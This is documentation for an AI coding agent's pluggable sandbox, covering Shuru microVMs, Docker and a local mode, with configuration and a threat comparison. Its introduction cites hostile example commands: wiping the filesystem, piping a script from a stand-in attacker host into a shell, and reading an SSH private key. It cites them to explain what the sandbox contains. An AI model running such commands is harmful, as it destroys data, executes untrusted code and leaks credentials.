# Sandbox Backends

ClashCode runs LLM-generated shell commands inside a **sandbox** — an
isolated environment where an agent's `rm -rf /`, `curl evil.com | sh`,
or `cat ~/.ssh/id_rsa` can't touch your host.

The sandbox layer is pluggable. Three backends ship in the box:

| Backend  | Isolation                              | Host platforms       | Default on        |
|----------|----------------------------------------|----------------------|-------------------|
| `shuru`  | **true microVM** (own Linux kernel)    | macOS / Apple Silicon | macOS + arm64     |
| `docker` | Linux container (shared host kernel)   | Linux, macOS, Windows | Linux, other      |
| `local`  | **none** — runs on host shell          | all                   | nothing — opt-in  |

The active backend is chosen by `sandbox.backend` in `.clashcode/settings.json`
(values: `auto` | `docker` | `shuru` | `local`). `auto` picks Shuru on
macOS/Apple Silicon when the `shuru` CLI is installed, otherwise Docker,
and falls back to `local` if neither is available.

Check or switch at runtime:

```
/sandbox                         # show active backend
/sandbox shuru                   # force a specific backend
/sandbox auto                    # auto-detect
```

---

## Why Shuru on macOS

On Apple Silicon Macs, **Shuru** (https://github.com/superhq-ai/shuru) is
the preferred backend. It boots lightweight Linux VMs using Apple's
Virtualization.framework — no Docker Desktop required.

Compared to Docker, Shuru gives you:

| Threat                         | Docker                         | Shuru                                   |
|--------------------------------|--------------------------------|-----------------------------------------|
| Agent deletes host files       | depends on mounts (often yes)  | **no** — host FS is RO / unreachable    |
| Agent exfiltrates via network  | yes if network enabled         | **blocked by default** (allowlist only) |
| Agent steals host env vars     | yes if passed through          | **no** — secrets never enter VM         |
| Agent escapes via kernel bug   | shared kernel = blast radius   | **separate kernel** per VM              |

### How Shuru protects secrets

API keys stay **on the host**. When the agent runs
`curl -H "Authorization: Bearer $API_KEY" https://api.openai.com/...`,
the guest only sees a random placeholder token. A proxy running on the
host substitutes the real secret — and only for explicitly allowlisted
destinations. The real key never enters the VM.

### First-run bootstrap

On first use, ClashCode creates a **checkpoint** called `clashcode-env`
with common tooling preinstalled (python3, git, curl, build-essential, jq).
This is a one-time ~30–60s cost. Subsequent sandbox boots start from this
checkpoint in ~1s.

---

## Install Shuru (macOS only)

```sh
brew tap superhq-ai/tap && brew install shuru
```

Or use the install script:

```sh
curl -fsSL https://raw.githubusercontent.com/superhq-ai/shuru/main/install.sh | sh
```

Then add the TypeScript SDK to ClashCode:

```sh
pnpm add @superhq/shuru
# or: bun add @superhq/shuru
```

The SDK is loaded dynamically at runtime, so non-macOS machines don't
need it installed.

---

## Configuration

All sandbox settings live under `sandbox` in `.clashcode/settings.json`:

```json
{
  "sandbox": {
    "enabled": true,
    "backend": "auto",
    "persistent": false,
    "image": "clashcode-sandbox",
    "shuru": {
      "checkpoint": "clashcode-env",
      "cpus": 2,
      "memory": 2048,
      "diskSize": 4096,
      "allowNet": false,
      "allowedHosts": []
    }
  }
}
```

| Key                           | Default           | Description                                                   |
|-------------------------------|-------------------|---------------------------------------------------------------|
| `sandbox.enabled`             | `true`            | Globally enable/disable the sandbox tools                     |
| `sandbox.backend`             | `"auto"`          | `auto` \| `docker` \| `shuru` \| `local`                      |
| `sandbox.image`               | `clashcode-sandbox` | Docker image name (docker backend only)                     |
| `sandbox.shuru.checkpoint`    | `"clashcode-env"` | Named checkpoint to boot from (null = no checkpoint)          |
| `sandbox.shuru.cpus`          | `2`               | vCPUs allocated to the microVM                                |
| `sandbox.shuru.memory`        | `2048`            | MB of RAM                                                     |
| `sandbox.shuru.diskSize`      | `4096`            | MB of disk                                                    |
| `sandbox.shuru.allowNet`      | `false`           | Enable outbound network for the VM                            |
| `sandbox.shuru.allowedHosts`  | `[]`              | Host allowlist (e.g. `["api.openai.com", "registry.npmjs.org"]`) |

Set individual keys via CLI:

```
/config set sandbox.backend shuru
/config set sandbox.shuru.cpus 4
/config set sandbox.shuru.memory 4096
/config set sandbox.shuru.allowNet true
```

---

## When to use which backend

- **Shuru** — You're on an Apple Silicon Mac. You want the strongest
  isolation available without running a full Docker Desktop. This is the
  recommended default.

- **Docker** — You're on Linux, or on macOS/Windows without Shuru. Good
  isolation, but the agent shares your host kernel. Network is blocked
  by default via `--network none`.

- **Local** — **Development only.** No isolation. The agent runs shell
  commands directly on your host. Use this only when iterating on
  ClashCode itself, not for real work.

---

## Implementation notes

- `SandboxBackend` (in `src/sandbox/backend.ts`) is the shared interface:
  `start/exec/writeFile/readFile/destroy/isRunning`. Any backend that
  implements it can be swapped in.
- The Shuru backend (`src/sandbox/backends/shuru.ts`) depends on
  `@superhq/shuru` as an **optional peer dependency** — it's loaded via
  dynamic import so Linux users who never use Shuru don't need it in
  their `node_modules`.
- Path validation lives in `backend.ts` (`validateSandboxPath`) and is
  called by every backend before any file I/O. Paths must be absolute,
  traversal-free, and free of shell metacharacters.
- Cleanup hooks are registered on `process.exit/SIGINT/SIGTERM` in
  `orchestrator/tools.ts` so sandboxes tear down even on crashes.
